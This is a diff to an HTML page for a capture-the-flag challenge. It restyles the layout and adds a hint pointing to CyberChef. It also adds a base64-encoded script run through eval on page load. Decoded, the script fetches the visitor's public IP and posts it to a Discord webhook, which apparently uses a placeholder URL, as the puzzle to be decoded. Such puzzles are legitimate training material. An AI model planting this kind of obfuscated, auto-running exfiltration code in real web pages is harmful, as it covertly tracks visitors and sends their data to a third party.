@@ -5,11 +5,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="styles.css">
-
   <style>
-
-  @import url('https://fonts.googleapis.com/css2?family=Jost&display=swap');
-
     body {
       font-family: 'Courier New', Courier, monospace;
       display: flex;
@@ -24,7 +20,6 @@
     .container {
       text-align: center;
       transition: transform 2s;
-      ;
     }
 
     .title {
@@ -36,7 +31,6 @@
       letter-spacing: .15em;
       width: fit-content;
       animation: typing 4s steps(40, end), blink-caret .75s step-end infinite, hide-caret 0s forwards 4s;
-      ;
     }
 
     .briefing {
@@ -48,25 +42,23 @@
 
     .moved {
       transform: translateY(-40vh) scale(0.75);
+      transition: transform 2s;
     }
 
     @keyframes typing {
       from {
         width: 0;
       }
-
       to {
         width: 100%;
       }
     }
 
     @keyframes blink-caret {
-
       from,
       to {
         border-color: transparent;
       }
-
       50% {
         border-color: #61dafb;
       }
@@ -82,34 +74,22 @@
       from {
         opacity: 0;
       }
-
       to {
         opacity: 1;
       }
     }
 
-    .flagContainer {
-      position: fixed;
-      width: 200px;
-      margin: 50px auto;
-      bottom: 0%;
-      text-align: center;
-    }
-
-    .hintContainer {
-      position: fixed;
-      margin: 50px auto;
-      bottom: 10%;
-      text-align: center;
-    }
-
     .text-box {
-      position: absolute;
-      top: 0;
-      left: 0;
+      position: fixed;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
       width: 100%;
+      text-align: center;
+      padding: 10px;
       box-sizing: border-box;
-      margin-top: -25%;
+      background-color: rgb(39, 39, 39);
+      z-index: 10;
     }
 
     .button {
@@ -164,65 +144,88 @@
     .button.correct {
       background-color: forestgreen;
     }
+
+    .typing-container, .prompt-container {
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 1.2em;
+      white-space: pre;
+      border-right: 2px solid #61dafb;
+      padding: 10px;
+      margin: 20px auto;
+      overflow: hidden; /* Ensures the text doesn’t overflow the container */
+      width: fit-content;
+      position: fixed;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 10;
+    }
+
+    .typing-container {
+      top: 50%; /* Center vertically */
+      transform: translate(-50%, -50%); /* Adjust position to center correctly */
+    }
+
+    .prompt-container {
+      top: 60%; /* Adjusted to be below the typing container */
+      opacity: 0; /* Initially hidden */
+      transition: opacity 1s; /* Smooth fade-in effect */
+    }
+    .hint {
+    font-family: "Jost", sans-serif;
+    position: fixed; /* Change to fixed */
+    background-color: black;
+    border-radius: 4em;
+    font-size: 16px;
+    color: white;
+    padding: 0.8em 1.8em;
+    cursor: pointer;
+    user-select: none;
+    text-align: center;
+    text-decoration: none;
+    transition-duration: 0.4s;
+    bottom: 80px; /* Positioning from the bottom */
+    right: 50px;  /* Adjust this value to position the button from the right edge */
+}
+    .align {
+      text-align: right;
+    }
   </style>
-
-  <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      const title = document.querySelector('.title');
-      const briefing = document.querySelector('.briefing');
-      const container = document.querySelector('.container');
-
-      briefing.addEventListener('animationend', () => {
-        setTimeout(() => {
-          container.classList.add('moved');
-        }, 4000);
-      });
-    });
-
-  </script>
 </head>
-
 <body>
+  <script>
+    const base64EncodedScript = "ICAgICAgICBjb25zdCA3NyA2NSA2MiA2OCA2ZiA2ZiA2YiA1NSA3MiA2YyA9IDI3IDY4IDc0IDc0IDcwIDczIDNhIDJmIDJmIDY0IDY5IDczIDYzIDZmIDcyIDY0IDJlIDYzIDZmIDZkIDJmIDYxIDcwIDY5IDJmIDc3IDY1IDYyIDY4IDZmIDZmIDZiIDczIDJmIDMxIDMyIDMzIDM0IDM1IDM2IDJmIDMxIDMyIDMzIDYxIDYyIDYzIDI3OwoKICAgICAgICBhc3luYyBmdW5jdGlvbiBzZWFtb25zdGVyKCkgewogICAgICAgICAgICB0cnkgewoKICAgICAgICAgICAgICAgIGNvbnN0IDcyIDY1IDczIDcwIDZmIDZlIDczIDY1ID0gYXdhaXQgZmV0Y2goMjcgNjggNzQgNzQgNzAgNzMgM2EgMmYgMmYgNjEgNzAgNjkgMmUgNjkgNzAgNjkgNjYgNzkgMmUgNmYgNzIgNjcgM2YgNjYgNmYgNzIgNmQgNjEgNzQgM2QgNmEgNzMgNmYgNmUgMjcpOwogICAgICAgICAgICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IDcyIDY1IDczIDcwIDZmIDZlIDczIDY1Lmpzb24oKTsKICAgICAgICAgICAgICAgIGNvbnN0IDY5IDcwIDQxIDY0IDY0IDcyIDY1IDczIDczID0gNjQgNjEgNzQgNjEgMmUgNjkgNzA7CgoKICAgICAgICAgICAgICAgIGNvbnN0IDZkIDY1IDczIDczIDYxIDY3IDY1ID0gewogICAgICAgICAgICAgICAgICAgIGNvbnRlbnQ6IDYwIDU1IDczIDY1IDcyIDI3IDczIDIwIDcwIDc1IDYyIDZjIDY5IDYzIDIwIDQ5IDUwIDIwIDYxIDY0IDY0IDcyIDY1IDczIDczIDNhIDIwIDI0IDdiIDY5IDcwIDQxIDY0IDY0IDcyIDY1IDczIDczIDdkIDYwCiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgYXdhaXQgZmV0Y2goNzcgNjUgNjIgNjggNmYgNmYgNmIgNTUgNzIgNmMsIHsKICAgICAgICAgICAgICAgICAgICBtZXRob2Q6ICc1MCA0ZiA1MyA1NCcsCiAgICAgICAgICAgICAgICAgICAgaGVhZGVyczogewogICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSg2ZCA2NSA3MyA3MyA2MSA2NyA2NSkKICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgc2VhbW9uc3RlcigpOw";
+    
+    const decodedScript = atob(base64EncodedScript);
+    
+    eval(decodedScript);
+  </script>
+
+
   <div class="container">
     <h1 class="title">Mission Briefing</h1>
-    <p class="briefing">On some web pages, passwords are stored unencrypted.
-      Look on the source code of this page to find the correct flag!
-    </p>
+    <div id="typingContainer" class="typing-container"></div>
+    <div id="promptContainer" class="prompt-container"></div> <!-- New container for messages -->
   </div>
-
-  <div class="flagContainer">
-    <input type="text" id="flagInput" class="text-box" placeholder="Enter flag">
-    <a id="checkButton" class="button">Check Flag</a>
+  <div class="text-box">
+    <input type="text" id="flagInput" placeholder="Enter flag">
+    <button id="checkButton" class="button">Check Flag</button>
   </div>
-
-  <div class="hintContainer">
-    <p id="hint" type="text">Some browsers show the source of the page if you do Ctrl + U.</p>
-    <a id="hintButton" class="button">Hint</a>
+  <div>
+    <button id="hint" class="button hint">Hint</button>
   </div>
 
   <script>
-    const correctFlag = "correctFlag123";
-    document.addEventListener("DOMContentLoaded", () => {
-    const flagInput = document.getElementById("flagInput");
-    const checkButton = document.getElementById("checkButton");
-    const hintText = document.getElementById("hint")
-    hintText.style.display = 'none'
-    const hintButton = document.getElementById("hintButton")
-    hintButton.addEventListener("click", () => {
-      hintText.style.display = 'block'
-    })
-      checkButton.addEventListener("click", () => {
-        if (flagInput.value === correctFlag) {
-          checkButton.classList.add("correct");
-          setTimeout(() => {
-            window.location.href = "CTF5.html";
-          }, 2500);
-        } else {
-          checkButton.classList.remove("correct");
-        }
-      });
+    // Add a click event listener to the button
+    document.querySelector('.hint').addEventListener('click', function() {
+      alert('Use Cyberchef to decrypt the script.');
+
+      // After the alert is closed, open a new tab with the specified URL
+      window.open('https://cyberchef.io', '_blank');
     });
   </script>
+
+  <script src="flagsctf3.js" async></script>  <!--Not part of CTF. DO NOT OPEN-->
+
 </body>
 
 </html>
